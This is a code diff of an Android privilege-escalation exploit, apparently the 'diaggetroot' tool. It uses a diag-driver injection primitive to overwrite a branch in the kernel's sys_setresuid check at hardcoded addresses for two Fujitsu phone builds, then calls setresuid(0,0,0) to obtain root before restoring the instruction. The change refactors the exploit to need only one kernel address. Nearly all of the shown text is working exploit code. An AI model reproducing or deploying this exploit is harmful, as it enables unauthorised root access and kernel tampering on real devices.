@@ -31,18 +31,17 @@ typedef struct _supported_device {
   const char *device;
   const char *build_id;
   unsigned long int sys_setresuid_check_address;
-  unsigned long int delayed_rsp_id_address;
 } supported_device;
 
-supported_device supported_devices[] = {
-  { "F-03D", "V24R33Cc", 0xc00e83ce, 0xc0777dd0 },
-  { "F-12C", "V21",      0xc00e5ad2, 0xc075aca4 }
+static supported_device supported_devices[] = {
+  { "F-03D", "V24R33Cc", 0xc00e83ce },
+  { "F-12C", "V21",      0xc00e5ad2 }
 };
 
 static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);
 
-static bool
-detect_injection_addresses(diag_injection_addresses *injection_addresses)
+static unsigned long int
+detect_sys_setresuid_check_addresses(void)
 {
   int i;
   char device[PROP_VALUE_MAX];
@@ -54,75 +53,58 @@ detect_injection_addresses(diag_injection_addresses *injection_addresses)
   for (i = 0; i < n_supported_devices; i++) {
     if (!strcmp(device, supported_devices[i].device) &&
         !strcmp(build_id, supported_devices[i].build_id)) {
-      injection_addresses->target_address =
-        supported_devices[i].sys_setresuid_check_address;
-      injection_addresses->delayed_rsp_id_address =
-        supported_devices[i].delayed_rsp_id_address;
-        return true;
+      return supported_devices[i].sys_setresuid_check_address;
     }
   }
   printf("%s (%s) is not supported.\n", device, build_id);
 
-  return false;
+  return 0;
 }
 
 static bool
 inject_command(const char *command,
-               diag_injection_addresses *injection_addresses)
+               unsigned long int sys_setresuid_check_address)
 {
   struct values injection_data;
 
-  injection_data.address = injection_addresses->target_address;
+  injection_data.address = sys_setresuid_check_address;
   injection_data.value = command[0] | (command[1] << 8);
 
-  return inject(&injection_data, 1,
-                injection_addresses->delayed_rsp_id_address) == 0;
+  return inject(&injection_data, 1) == 0;
 }
 
 static bool
-break_sys_setresuid(diag_injection_addresses *injection_addresses)
+break_sys_setresuid(unsigned long int sys_setresuid_check_address)
 {
   const char beq[] = { 0x00, 0x0a };
-  return inject_command(beq, injection_addresses);
+  return inject_command(beq, sys_setresuid_check_address);
 }
 
 static bool
-restore_sys_setresuid(diag_injection_addresses *injection_addresses)
+restore_sys_setresuid(unsigned long int sys_setresuid_check_address)
 {
   const char bne[] = { 0x00, 0x1a };
-  return inject_command(bne, injection_addresses);
-}
-
-static void
-usage(void)
-{
-  printf("Usage:\n");
-  printf("\tdiaggetroot [sys_setresuid_address] [delayed_rsp_id address]\n");
+  return inject_command(bne, sys_setresuid_check_address);
 }
 
 int
 main(int argc, char **argv)
 {
   int ret;
-  diag_injection_addresses injection_addresses;
+  unsigned long int sys_setresuid_check_address;
 
-  if (argc != 3) {
-    if (!detect_injection_addresses(&injection_addresses)) {
-      usage();
-      exit(EXIT_FAILURE);
-    }
-  } else {
-    injection_addresses.target_address = strtoul(argv[1], NULL, 16);
-    injection_addresses.delayed_rsp_id_address = strtoul(argv[2], NULL, 16);
+  sys_setresuid_check_address = detect_sys_setresuid_check_addresses();
+  if (!sys_setresuid_check_address) {
+    exit(EXIT_FAILURE);
   }
 
-  ret = break_sys_setresuid(&injection_addresses);
+  ret = break_sys_setresuid(sys_setresuid_check_address);
   if (ret < 0) {
     exit(EXIT_FAILURE);
   }
 
   ret = setresuid(0, 0, 0);
-  restore_sys_setresuid(&injection_addresses);
+  restore_sys_setresuid(sys_setresuid_check_address);
 
   if (ret < 0) {
     printf("failed to get root access\n");
